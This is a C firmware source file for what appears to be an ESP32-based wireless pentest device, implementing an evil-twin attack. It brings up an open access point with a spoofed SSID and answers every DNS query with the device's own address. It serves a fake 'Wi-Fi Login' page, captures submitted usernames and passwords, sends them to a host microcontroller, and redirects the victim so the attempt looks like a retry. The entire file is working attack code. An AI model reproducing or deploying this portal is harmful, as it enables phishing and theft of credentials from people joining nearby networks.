/**
 * M1 RPC — Evil-twin captive portal.
 *
 * Brings up an open SoftAP, redirects every DNS query to the AP gateway with a
 * tiny self-contained UDP responder, and serves a captive portal login page via
 * esp_http_server. Submitted credentials are forwarded to the STM32 as
 * M1_EVT_EVILTWIN_CREDS events.
 *
 * Kept independent of the esp-at "at" component (whose DNS server lives behind a
 * private header) so it builds cleanly inside the rpc component.
 */

#include <string.h>
#include <stdbool.h>
#include <stdio.h>

#include "m1_rpc.h"
#include "m1_rpc_proto.h"
#include "m1_rpc_eviltwin.h"

#include "esp_wifi.h"
#include "esp_netif.h"
#include "esp_log.h"
#include "esp_http_server.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "lwip/sockets.h"

static const char *TAG = "M1_EvilTwin";

static bool s_active = false;
static httpd_handle_t s_httpd = NULL;
static TaskHandle_t s_dns_task = NULL;
static volatile bool s_dns_stop = false;
static char s_portal_ssid[33] = "Free WiFi";
static uint32_t s_gateway_ip = 0; /* network byte order */

/* ── Captive portal page ──────────────────────────────────────── */

static const char s_portal_html[] =
    "<!DOCTYPE html><html><head><meta name=\"viewport\" "
    "content=\"width=device-width,initial-scale=1\">"
    "<title>Sign in</title></head><body style=\"font-family:sans-serif;"
    "max-width:380px;margin:40px auto;padding:0 16px\">"
    "<h2>Wi-Fi Login</h2>"
    "<p>Please sign in to access the internet.</p>"
    "<form method=\"POST\" action=\"/login\">"
    "<p>Email / Username<br><input name=\"u\" style=\"width:100%;padding:8px\"></p>"
    "<p>Password<br><input name=\"p\" type=\"password\" style=\"width:100%;padding:8px\"></p>"
    "<p><button type=\"submit\" style=\"padding:10px 16px\">Connect</button></p>"
    "</form></body></html>";

/* ── URL-decode a form field in place ─────────────────────────── */

static int hex_val(char c)
{
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
    return -1;
}

/* Extract field "name=" from an application/x-www-form-urlencoded body. */
static uint8_t form_field(const char *body, const char *name,
                          char *out, uint8_t out_max)
{
    char key[8];
    int klen = snprintf(key, sizeof(key), "%s=", name);
    const char *p = body;
    uint8_t n = 0;

    while ((p = strstr(p, key)) != NULL) {
        /* Must be at start of body or right after a '&'. */
        if (p == body || *(p - 1) == '&') {
            break;
        }
        p += klen;
    }
    if (!p) return 0;
    p += klen;

    while (*p && *p != '&' && n + 1 < out_max) {
        char c = *p++;
        if (c == '+') {
            c = ' ';
        } else if (c == '%' && hex_val(p[0]) >= 0 && hex_val(p[1]) >= 0) {
            c = (char)((hex_val(p[0]) << 4) | hex_val(p[1]));
            p += 2;
        }
        out[n++] = c;
    }
    out[n] = '\0';
    return n;
}

/* ── HTTP handlers ────────────────────────────────────────────── */

static esp_err_t portal_get_handler(httpd_req_t *req)
{
    httpd_resp_set_type(req, "text/html");
    httpd_resp_send(req, s_portal_html, HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

static esp_err_t login_post_handler(httpd_req_t *req)
{
    char body[256];
    int total = 0;
    int received;

    while (total < (int)sizeof(body) - 1 &&
           (received = httpd_req_recv(req, body + total,
                                      sizeof(body) - 1 - total)) > 0) {
        total += received;
    }
    body[total > 0 ? total : 0] = '\0';

    char user[64];
    char pass[64];
    uint8_t ulen = form_field(body, "u", user, sizeof(user));
    uint8_t plen = form_field(body, "p", pass, sizeof(pass));

    /* Event: [ssid_len][ssid][user_len][user][pass_len][pass] */
    uint8_t evt[1 + 32 + 1 + 64 + 1 + 64];
    uint16_t pos = 0;
    uint8_t slen = (uint8_t)strlen(s_portal_ssid);
    evt[pos++] = slen;
    memcpy(evt + pos, s_portal_ssid, slen);
    pos += slen;
    evt[pos++] = ulen;
    memcpy(evt + pos, user, ulen);
    pos += ulen;
    evt[pos++] = plen;
    memcpy(evt + pos, pass, plen);
    pos += plen;
    m1_rpc_send_event(M1_EVT_EVILTWIN_CREDS, evt, pos);

    ESP_LOGI(TAG, "Captured creds (u=%u p=%u bytes)", ulen, plen);

    /* Send victim back to the portal so it looks like a retry. */
    httpd_resp_set_status(req, "302 Found");
    httpd_resp_set_hdr(req, "Location", "/");
    httpd_resp_send(req, NULL, 0);
    return ESP_OK;
}

/* Any other path → serve the portal (captive-portal detection probes). */
static esp_err_t catch_all_handler(httpd_req_t *req)
{
    return portal_get_handler(req);
}

static void httpd_start_portal(void)
{
    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
    config.uri_match_fn = httpd_uri_match_wildcard;
    config.max_uri_handlers = 4;

    if (httpd_start(&s_httpd, &config) != ESP_OK) {
        s_httpd = NULL;
        return;
    }

    httpd_uri_t login = {
        .uri = "/login", .method = HTTP_POST, .handler = login_post_handler,
    };
    httpd_uri_t root = {
        .uri = "/", .method = HTTP_GET, .handler = portal_get_handler,
    };
    httpd_uri_t any = {
        .uri = "/*", .method = HTTP_GET, .handler = catch_all_handler,
    };
    httpd_register_uri_handler(s_httpd, &login);
    httpd_register_uri_handler(s_httpd, &root);
    httpd_register_uri_handler(s_httpd, &any);
}

/* ── Minimal DNS responder (answers every A query with the AP IP) ─ */

static void dns_task_func(void *arg)
{
    (void)arg;
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        s_dns_task = NULL;
        vTaskDelete(NULL);
        return;
    }

    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(53);
    addr.sin_addr.s_addr = htonl(INADDR_ANY);
    if (bind(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        close(sock);
        s_dns_task = NULL;
        vTaskDelete(NULL);
        return;
    }

    struct timeval tv = { .tv_sec = 1, .tv_usec = 0 };
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    uint8_t buf[512];
    while (!s_dns_stop) {
        struct sockaddr_in src;
        socklen_t slen = sizeof(src);
        int n = recvfrom(sock, buf, sizeof(buf), 0,
                         (struct sockaddr *)&src, &slen);
        if (n < (int)sizeof(uint16_t) * 6) {
            continue; /* timeout or runt packet */
        }

        /* Build a response: echo the question, append one A answer. */
        if (n + 16 > (int)sizeof(buf)) {
            continue;
        }
        buf[2] |= 0x80; /* QR = response */
        buf[3] |= 0x80; /* RA */
        buf[7] = 1;     /* ANCOUNT = 1 (low byte; assume single question) */

        int p = n;
        buf[p++] = 0xC0; /* name pointer to the question at offset 12 */
        buf[p++] = 0x0C;
        buf[p++] = 0x00; buf[p++] = 0x01; /* TYPE A */
        buf[p++] = 0x00; buf[p++] = 0x01; /* CLASS IN */
        buf[p++] = 0x00; buf[p++] = 0x00; /* TTL */
        buf[p++] = 0x00; buf[p++] = 0x3C; /* TTL = 60s */
        buf[p++] = 0x00; buf[p++] = 0x04; /* RDLENGTH = 4 */
        memcpy(buf + p, &s_gateway_ip, 4); /* AP gateway IP */
        p += 4;

        sendto(sock, buf, p, 0, (struct sockaddr *)&src, slen);
    }

    close(sock);
    s_dns_task = NULL;
    vTaskDelete(NULL);
}

/* ── Public API ───────────────────────────────────────────────── */

/* Short code for the last failure, surfaced to the host for diagnosis. */
static char s_et_err[40] = "";

const char *m1_eviltwin_last_err(void)
{
    return s_et_err;
}

m1_status_t m1_eviltwin_start(const uint8_t *payload, uint16_t len)
{
    esp_err_t err;

    s_et_err[0] = '\0';
    if (len < 2) { snprintf(s_et_err, sizeof(s_et_err), "ARGS"); return M1_ERR_INVALID_ARGS; }
    if (s_active) { snprintf(s_et_err, sizeof(s_et_err), "RUNNING"); return M1_ERR_ALREADY_RUNNING; }

    uint8_t ssid_len = payload[0];
    if (ssid_len == 0 || ssid_len > 32 || 1 + ssid_len >= len) {
        snprintf(s_et_err, sizeof(s_et_err), "SSID");
        return M1_ERR_INVALID_ARGS;
    }
    uint8_t channel = payload[1 + ssid_len];
    if (channel < 1 || channel > 14) channel = 1;

    memcpy(s_portal_ssid, payload + 1, ssid_len);
    s_portal_ssid[ssid_len] = '\0';

    /* Ensure an AP netif exists (esp-at usually creates one at boot). */
    esp_netif_t *ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
    if (!ap_netif) {
        ap_netif = esp_netif_create_default_wifi_ap();
    }

    /* Open SoftAP with the spoofed SSID. */
    wifi_config_t cfg = {0};
    memcpy(cfg.ap.ssid, s_portal_ssid, ssid_len);
    cfg.ap.ssid_len = ssid_len;
    cfg.ap.channel = channel;
    cfg.ap.authmode = WIFI_AUTH_OPEN;
    cfg.ap.max_connection = 8;

    wifi_mode_t cur_mode = WIFI_MODE_NULL;
    esp_wifi_get_mode(&cur_mode);
    if (cur_mode == WIFI_MODE_STA) {
        esp_wifi_set_mode(WIFI_MODE_APSTA);
    } else {
        esp_wifi_set_mode(WIFI_MODE_AP);
    }
    err = esp_wifi_set_config(WIFI_IF_AP, &cfg);
    if (err != ESP_OK) {
        snprintf(s_et_err, sizeof(s_et_err), "CFG:%s", esp_err_to_name(err));
        return M1_ERR_HARDWARE;
    }
    err = esp_wifi_start();
    if (err != ESP_OK) {
        snprintf(s_et_err, sizeof(s_et_err), "START:%s", esp_err_to_name(err));
        return M1_ERR_HARDWARE;
    }

    /* Resolve the AP gateway IP for DNS answers (default 192.168.4.1). */
    s_gateway_ip = htonl(0xC0A80401);
    if (ap_netif) {
        esp_netif_ip_info_t ip_info;
        if (esp_netif_get_ip_info(ap_netif, &ip_info) == ESP_OK &&
            ip_info.ip.addr != 0) {
            s_gateway_ip = ip_info.ip.addr; /* already network byte order */
        }
    }

    /* Start DNS hijack + HTTP portal. */
    s_dns_stop = false;
    if (xTaskCreate(dns_task_func, "m1etdns", 4096, NULL, 5, &s_dns_task)
        != pdPASS) {
        s_dns_task = NULL;
        esp_wifi_stop();
        snprintf(s_et_err, sizeof(s_et_err), "DNS_TASK");
        return M1_ERR_NO_MEM;
    }

    httpd_start_portal();
    if (!s_httpd) {
        s_dns_stop = true;
        esp_wifi_stop();
        snprintf(s_et_err, sizeof(s_et_err), "HTTPD");
        return M1_ERR_HARDWARE;
    }

    s_active = true;
    ESP_LOGI(TAG, "Evil-twin up: \"%s\" ch %u", s_portal_ssid, channel);
    return M1_OK;
}

m1_status_t m1_eviltwin_stop(void)
{
    if (!s_active) return M1_ERR_NOT_RUNNING;

    if (s_httpd) {
        httpd_stop(s_httpd);
        s_httpd = NULL;
    }

    s_dns_stop = true;
    int retry = 30;
    while (s_dns_task != NULL && retry-- > 0) {
        vTaskDelay(pdMS_TO_TICKS(50));
    }
    s_dns_task = NULL;

    wifi_mode_t cur_mode = WIFI_MODE_NULL;
    esp_wifi_get_mode(&cur_mode);
    if (cur_mode == WIFI_MODE_APSTA) {
        esp_wifi_set_mode(WIFI_MODE_STA);
    } else if (cur_mode == WIFI_MODE_AP) {
        esp_wifi_set_mode(WIFI_MODE_NULL);
        esp_wifi_stop();
    }

    s_active = false;
    ESP_LOGI(TAG, "Evil-twin stopped");
    return M1_OK;
}
